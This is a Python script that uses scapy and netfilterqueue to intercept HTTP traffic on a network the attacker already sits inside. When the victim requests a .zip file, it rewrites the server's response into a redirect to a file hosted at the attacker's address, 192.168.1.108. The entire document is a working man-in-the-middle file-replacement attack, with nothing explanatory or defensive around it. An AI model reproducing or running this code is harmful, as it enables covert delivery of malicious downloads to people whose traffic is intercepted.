#!/usr/bin/env python

import scapy.all as scapy
import netfilterqueue
ack_list=[]
try:
    def process_packet(packet):
        scapy_packet =scapy.IP(packet.get_payload())
        if scapy_packet.haslayer(scapy.Raw)  and scapy_packet.haslayer(scapy.TCP):
            if scapy_packet[scapy.TCP].dport == 80:
                # if ".zip" in scapy_packet[scapy.Raw].load.decode():
                if b".zip" in scapy_packet[scapy.Raw].load and b"192.168.1.108" not in scapy_packet[scapy.Raw].load:
                    print("[+] Zip ")
                    ack_list.append(scapy_packet[scapy.TCP].ack)
            elif scapy_packet[scapy.TCP].sport == 80:
                if scapy_packet[scapy.TCP].seq in ack_list:
                    ack_list.remove(scapy_packet[scapy.TCP].seq)
                    print("Changing")
                    scapy_packet[scapy.Raw].load=b"HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.1.108/fayl.zip\n\n"
                    del scapy_packet[scapy.IP].len
                    del scapy_packet[scapy.IP].chksum
                    del scapy_packet[scapy.TCP].chksum
                    packet.set_payload(bytes(scapy_packet))

        packet.accept()
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("Quitting.............")